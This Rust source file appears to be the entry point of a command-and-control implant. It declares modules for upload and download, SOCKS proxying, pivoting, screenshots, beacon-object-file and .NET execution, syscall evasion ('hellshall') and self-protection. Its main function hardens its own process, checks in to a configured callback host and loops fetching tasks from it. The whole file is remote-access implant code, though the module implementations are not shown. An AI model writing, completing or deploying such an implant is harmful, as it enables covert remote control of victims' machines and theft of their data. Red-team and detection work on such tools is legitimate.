mod config;
mod checkin;
mod transport;
mod tasking;
mod features {
    pub mod exit;
    pub mod pong;
    pub mod filesystem;
    pub mod upload;
    pub mod download;
    pub mod psw;
    pub mod socks;
    pub mod executeBOF;
    pub mod executeDOT;
    pub mod list_processes;
    pub mod pivot;
    pub mod screenshot;
}
mod hellshall;
mod selfprotect;
mod worker;

use std::{thread, time::Duration};

fn main() {
    // Worker subprocess mode — run payload and exit without any agent init.
    let args: Vec<String> = std::env::args().collect();
    if args.len() >= 2 {
        match args[1].as_str() {
            "--worker-bof" => {
                worker::run_bof_worker();
                return;
            }
            "--worker-dot" => {
                worker::run_dot_worker();
                return;
            }
            _ => {}
        }
    }

    selfprotect::set_process_security_descriptor();

    println!("URL: {}", config::callback_host);
    checkin::checkin();

    loop {
        if let Err(e) = tasking::getTasking() {
            eprintln!("Tasking error: {}", e);
        }
        thread::sleep(Duration::from_millis(config::callback_interval * 1000));
    }
}
